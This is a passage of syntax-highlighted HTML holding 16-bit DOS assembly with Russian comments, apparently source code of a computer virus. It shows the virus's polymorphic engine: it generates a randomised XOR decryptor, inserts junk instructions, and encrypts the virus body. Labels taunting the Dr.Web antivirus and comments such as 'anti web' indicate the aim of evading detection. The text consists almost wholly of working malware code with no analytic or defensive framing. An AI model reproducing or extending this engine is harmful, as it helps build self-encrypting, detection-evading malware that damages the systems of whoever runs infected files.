           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">OPTIMAZI2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">randmrs</span><span class="sc0">
           </span><span class="sc6">CALL</span><span class="sc0"> </span><span class="sc5">OPTIMAZI</span><span class="sc0">
</span><span class="sc5">FuckuDrweb2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">RET</span><span class="sc0"> </span><span class="sc1">; Та точка куда мы посылаем вЕБА</span><span class="sc0">
</span><span class="sc5">OPTIMAZI3</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">random</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">
</span><span class="sc5">OPTIMAZI5_1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OPTIMAZI4</span><span class="sc0">
</span><span class="sc5">OPTIMAZI5_2</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OPTIMAZI4</span><span class="sc0">
</span><span class="sc5">OPTIMAZI5_3</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">03</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">OPTIMAZI4</span><span class="sc0">
</span><span class="sc5">OPTIMAZI5_4</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">04</span><span class="sc0">
</span><span class="sc5">OPTIMAZI4</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cld</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI2</span><span class="sc0">
           </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">FuckuDrweb</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">Make_Vbady</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
            </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
            </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc0">
           </span><span class="sc1">;---------</span><span class="sc0">
</span><span class="sc1">; morph mov ax,46h  mov ds,ax</span><span class="sc0">
</span><span class="sc1">;   Здесь готовиться Сырец.</span><span class="sc0">
</span><span class="sc5">repon</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">007h</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
           </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">addcom</span><span class="sc0">
           </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">repon</span><span class="sc0">
</span><span class="sc5">addcom</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">k1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">k2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
           </span><span class="sc1">;---------</span><span class="sc0">
           </span><span class="sc1">; save decripter in cs:Dkr</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">Dkr</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cc1</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">c11</span><span class="sc4">-</span><span class="sc5">cc1</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
             </span><span class="sc1">;----</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0">  </span><span class="sc1">;ah=rn1,al=rn2</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">03h</span><span class="sc0"> </span><span class="sc1">;rn1</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nc1</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
            </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc8">cl</span><span class="sc0"> </span><span class="sc1">;rn1*8</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">  </span><span class="sc1">;  set mov r1,[bx]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
            </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nc3</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ah</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">;set xor  r1,key</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nc4</span><span class="sc0">
           </span><span class="sc5">nc3</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">],</span><span class="sc2">3590h</span><span class="sc0"> </span><span class="sc1">; set xor r1,key</span><span class="sc0">
           </span><span class="sc5">nc4</span><span class="sc4">:</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nc2</span><span class="sc0">
           </span><span class="sc5">nc1</span><span class="sc4">:</span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">2fh</span><span class="sc0">
               </span><span class="sc6">mov</span><span class="sc0">  </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c5</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0f5h</span><span class="sc0"> </span><span class="sc1">;set</span><span class="sc0">
           </span><span class="sc5">nc2</span><span class="sc4">:</span><span class="sc0">
           </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; cmp rn2</span><span class="sc0">
           </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">nc_1</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">;set mov r2,offsetvir</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c3</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">4</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">  </span><span class="sc1">; set mov r1,[r2]</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cc2</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; pop r2</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">cc2</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c7</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; set inc r2</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c7</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c8</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">     </span><span class="sc1">; set inc r2</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c8</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">nc_2</span><span class="sc0">
        </span><span class="sc5">nc_1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc5">nc_2</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c4</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">;c6:=c4</span><span class="sc0">
              </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">c6</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">dl</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0FFFFh</span><span class="sc0">  </span><span class="sc1">; get key</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">  </span><span class="sc1">;fileATR</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">keyCRC</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">c5</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc1">;---------</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">160</span><span class="sc0">
</span><span class="sc9">repeat</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fffFh</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI3</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">stosw</span><span class="sc0">
           </span><span class="sc6">loop</span><span class="sc0">  </span><span class="sc9">repeat</span><span class="sc0">
            </span><span class="sc1">;--------------</span><span class="sc0">
             </span><span class="sc1">; anti web 1 level</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">k1</span><span class="sc0">
             </span><span class="sc1">;mov cx,k2-k1    ;</span><span class="sc0">
             </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_3</span><span class="sc0">
            </span><span class="sc1">; mov cx,k3-k2    ;</span><span class="sc0">
            </span><span class="sc1">; call OPTIMAZI4</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_2</span><span class="sc0">
             </span><span class="sc1">;mov cx,k4-k3</span><span class="sc0">
             </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_3</span><span class="sc0">
             </span><span class="sc1">;mov cx,k5-k4</span><span class="sc0">
             </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
             </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_4</span><span class="sc0">
           </span><span class="sc1">;  mov cx,decript-k5</span><span class="sc0">
           </span><span class="sc1">;  call OPTIMAZI4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_2</span><span class="sc0">
                        </span><span class="sc1">; MOV DI,OFFSET @End</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">      </span><span class="sc1">; для настройки add bx,&lt;di</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cc1</span><span class="sc0">
           </span><span class="sc1">;mov cx,cc2-cc1</span><span class="sc0">
           </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_3</span><span class="sc0">
           </span><span class="sc1">;mov cx,cc3-cc2</span><span class="sc0">
           </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
           </span><span class="sc1">;mov cx,c1-cc3</span><span class="sc0">
           </span><span class="sc1">;call OPTIMAZI4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_3</span><span class="sc0">
          </span><span class="sc1">; mov cx,c2-c1</span><span class="sc0">
          </span><span class="sc1">; call OPTIMAZI4</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
          </span><span class="sc1">; mov cx,c3-c2</span><span class="sc0">
          </span><span class="sc1">; call OPTIMAZI4</span><span class="sc0">
          </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">cc4</span><span class="sc4">-</span><span class="sc5">C3</span><span class="sc0">    </span><span class="sc1">;C3</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                  </span><span class="sc1">;+  для занесения offset</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI4</span><span class="sc0">           </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">c4</span><span class="sc4">-</span><span class="sc5">cc4</span><span class="sc0">            </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">                      </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">                </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">PUSH</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">          </span><span class="sc1">;+       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI2</span><span class="sc0">   </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">c5</span><span class="sc4">-</span><span class="sc5">c4</span><span class="sc0">     </span><span class="sc1">;|       |     LOOP</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">              </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">        </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">CALL</span><span class="sc0">  </span><span class="sc5">OPTIMAZI2</span><span class="sc0">  </span><span class="sc1">;|       |</span><span class="sc0">
     </span><span class="sc1">;     mov cx,c6-c5     ;|       |</span><span class="sc0">
     </span><span class="sc1">;     call OPTIMAZI4   ;|       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_4</span><span class="sc0">
         </span><span class="sc1">; mov cx,c7-c6     ;|       |</span><span class="sc0">
         </span><span class="sc1">; call OPTIMAZI4   ;|       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_2</span><span class="sc0">
         </span><span class="sc1">; mov cx,c8-c7     ;|       |</span><span class="sc0">
         </span><span class="sc1">; call OPTIMAZI4   ;|       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
</span><span class="sc1">;          mov cx,c9-c8     ;|       |</span><span class="sc0">
</span><span class="sc1">;          call OPTIMAZI4   ;|       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
</span><span class="sc1">;          mov cx,c10-c9    ;|       |</span><span class="sc0">
</span><span class="sc1">;          call OPTIMAZI4   ;|       |</span><span class="sc0">
           </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OPTIMAZI5_1</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">c11</span><span class="sc4">-</span><span class="sc5">c10</span><span class="sc0">   </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">cld</span><span class="sc0">              </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">        </span><span class="sc1">;|       |</span><span class="sc0">
           </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">;OLD DI  ;-       |</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DI</span><span class="sc0">                </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc8">DX</span><span class="sc0">  </span><span class="sc1">; LINGTH C4    |  C10</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc2">0FFH</span><span class="sc0">              </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">SUB</span><span class="sc0"> </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc8">CL</span><span class="sc0">                </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">DL</span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc2">0ebh</span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                   </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">                </span><span class="sc1">;|</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                   </span><span class="sc1">;-</span><span class="sc0">
           </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">dx</span><span class="sc0">
           </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
           </span><span class="sc6">MOV</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0">
           </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
           </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">desh_size</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
          </span><span class="sc1">;-- востановим декриптор ----------------------</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">Dkr</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">cc1</span><span class="sc0">
             </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc5">c11</span><span class="sc4">-</span><span class="sc5">cc1</span><span class="sc0">
             </span><span class="sc6">cld</span><span class="sc0">
             </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">k1</span><span class="sc4">],</span><span class="sc2">0b8h</span><span class="sc0">
          </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">k2</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc2">0d8h</span><span class="sc0">
          </span><span class="sc1">;----  добавляем bady &amp; Шифруем  -----------------</span><span class="sc0">
           </span><span class="sc5">sizeV</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0"> </span><span class="sc5">@End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0">
           </span><span class="sc6">POP</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
